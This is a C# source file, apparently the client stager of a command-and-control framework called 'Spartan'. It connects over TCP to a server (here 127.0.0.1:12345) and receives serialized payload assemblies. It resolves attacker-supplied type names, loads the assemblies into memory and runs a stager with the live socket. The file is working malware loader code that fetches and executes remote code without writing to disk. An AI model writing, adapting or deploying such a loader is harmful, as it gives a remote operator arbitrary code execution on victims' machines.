using System.Net.Sockets;
using System.Runtime.Loader;
using MessagePack;
using Spartan.Models.Payload;
using Spartan.Models;

namespace Spartan.Client;

internal class Program
{
    private static void Main()
    {
        var tcpClient = new TcpClient("127.0.0.1", 12345);

        var networkStream = tcpClient.GetStream();

        var binaryReader = new BinaryReader(networkStream);
        var binaryWriter = new BinaryWriter(networkStream);

        using var dataStream = new MemoryStream();

        while (true)
        {
            var chunkSize = binaryReader.ReadInt32();
            if (chunkSize == 0) break; // End of file

            var chunk = binaryReader.ReadBytes(chunkSize);
            dataStream.Write(chunk, 0, chunk.Length);
        }

        var payloadBytes = dataStream.ToArray();

        // deserialize the payload
        // var data =
        //     MessagePackSerializer.Deserialize<Schema>(payloadBytes);
        // var typeName = Type.GetType(data.TypeName);
        // var payloadData = data.Data;
        //
        // var payload = Convert.ChangeType(MessagePackSerializer.Deserialize(typeName, payloadData), typeName) as PayloadModel;
        
        var wrapper = MessagePackSerializer.Deserialize<SchemaWrapper>(payloadBytes);

        // Resolve the type
        var type = Type.GetType(wrapper.Schema.TypeName);
        if (type == null)
        {
            throw new InvalidOperationException($"Unable to resolve type: {wrapper.Schema.TypeName}");
        }

        // Deserialize the data into the resolved type
        var payload= MessagePackSerializer.Deserialize(type, wrapper.Data) as PayloadModel;

        var payloadName = payload.PayloadName;
        var payloadEntryPoint = payload.PayloadEntryPoint;
        var assemblyBinaries = payload.AssemblyBinaries;

        var payloadLoadContext = new AssemblyLoadContext("Payload");

        using var mainAssemblyStream = new MemoryStream(assemblyBinaries[payloadName]);
        var mainAssembly = payloadLoadContext.LoadFromStream(mainAssemblyStream);

        foreach (var (assemblyName, assemblyBinary) in assemblyBinaries)
        {
            if (assemblyName == payloadName) continue;

            using var assemblyStream = new MemoryStream(assemblyBinary);
            payloadLoadContext.LoadFromStream(assemblyStream);
        }

        // Instantiate and run the payload
        var stagerType = mainAssembly.GetType(payloadEntryPoint);
        var stagerInstance = Activator.CreateInstance(stagerType!, binaryReader, binaryWriter);
        dynamic stager = Convert.ChangeType(stagerInstance, stagerType!)!;

        stager.Run();
    }
}